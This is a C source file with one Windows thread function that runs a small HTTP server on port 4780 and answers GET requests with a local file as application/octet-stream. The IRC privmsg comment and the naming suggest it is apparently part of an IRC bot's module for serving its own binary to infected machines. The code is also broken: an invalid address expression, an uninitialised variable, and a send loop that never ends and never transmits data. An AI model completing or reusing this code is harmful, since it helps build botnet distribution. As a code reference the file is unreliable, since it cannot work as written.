

#include "include.h"
#include "hell.h"

int RSD_PORT;
int	rsdport					= 4780;
DWORD WINAPI HttpSendThread(LPVOID pParam)
{

int i;
	SOCKET listener;
	SOCKET newfd;
	unsigned long mode = 1;
	int addrlen,fdmax,reuse_addr = 1;

	struct sockaddr_in server_address;
	struct sockaddr_in remoteaddr;

	struct fd_set master;   // master file descriptor list
	struct fd_set read_fds; // temp file descriptor list for select()

	FD_ZERO(&master);    // clear the master and temp sets
	FD_ZERO(&read_fds);

	RSD_PORT = rsdport;
	listener = socket(AF_INET, SOCK_STREAM, 0);
	setsockopt(listener, SOL_SOCKET, SO_REUSEADDR, (char*)&reuse_addr,sizeof(reuse_addr));
	ioctlsocket(listener, FIONBIO, &mode);

	server_address.sin_family = AF_INET;
	server_address.sin_addr.s_addr = INADDR_ANY(GetIP(dwCurrentIp));
	server_address.sin_port = htons(RSD_PORT);

	if (bind(listener, (struct sockaddr *) &server_address,sizeof(server_address)) < 0 ) {
		return NULL;
	}

     listen(listener,10);

	FD_SET(listener, &master);

	fdmax = listener;

	char content[50]={0},date[70], time[30], buffer[4096];
	sprintf(content,"application/octet-stream");
//	GetModuleFileName(NULL,Filename,sizeof(tFile));
	HANDLE testfile = CreateFile(filename2,GENERIC_READ,FILE_SHARE_READ,0,OPEN_EXISTING,0,0);
    if (testfile == INVALID_HANDLE_VALUE) return NULL;
	u_long length = GetFileSize(testfile,NULL);
	CloseHandle(testfile);

	GetDateFormat(0x409,0,0,"ddd, dd MMM yyyy",date,70);
	GetTimeFormat(0x409,0,0,"HH:mm:ss",time,30);

	while(1) {
		read_fds = master;
		if (select(fdmax+1, &read_fds, NULL, NULL, NULL) == -1) {
			return NULL;
    	}
		for(int i = 0; i <= fdmax; i++) {
			if (FD_ISSET(i, &read_fds)) {
				if (i == (int)listener) {
					addrlen = sizeof(remoteaddr);
					if ((newfd = accept(listener, (struct sockaddr *)&remoteaddr,&addrlen)) != -1) {
						FD_SET(newfd, &master);
						if ((int)newfd > fdmax) {
							fdmax = newfd;
						}
					}
				} else {
					char buf[1024]={0};
					if (recv(i,buf, 512,0) <= 0) {
						FD_CLR((unsigned int)i, &master);
						closesocket(i);
					} else {
						if(strstr(buf,"GET ")!=NULL) {
							sprintf(buffer,"HTTP/1.0 200 OK\r\n"
										"Server: WINDOWS\r\n"
										"Cache-Control: no-cache,no-store,max-age=0\r\n"
										"pragma: no-cache\r\n"
										"Content-Type: %s\r\n"
										"Content-Length: %i\r\n"
										"Accept-Ranges: bytes\r\n"
										"Date: %s %s GMT\r\n"
										"Last-Modified: %s %s GMT\r\n"
										"Expires: %s %s GMT\r\n"
										"Connection: close\r\n\r\n"
											,content,length,date,time,date,time,date,time);

							send(i,buffer,strlen(buffer),0);
							unsigned int Fsize,Fsend=4096,move;
							DWORD mode=0;

							HANDLE testfile = CreateFile(filename2,GENERIC_READ,FILE_SHARE_READ,0,OPEN_EXISTING,0,0);
							if (testfile == INVALID_HANDLE_VALUE) closesocket(i);

							Fsize = GetFileSize(testfile,NULL);
	
							while (Fsize) {
								memset(buffer,0,sizeof(buffer));

						
								SetFilePointer(testfile, move, NULL, FILE_END);


							}

							if (testfile != INVALID_HANDLE_VALUE) 
								CloseHandle(testfile);
						//	    irc->privmsg(rsd.chan,"transfer(0x%8.8Xh): complete.");

						//fclosesocket(i);
						}
					}

				}
			}

		}
	}

return NULL;
}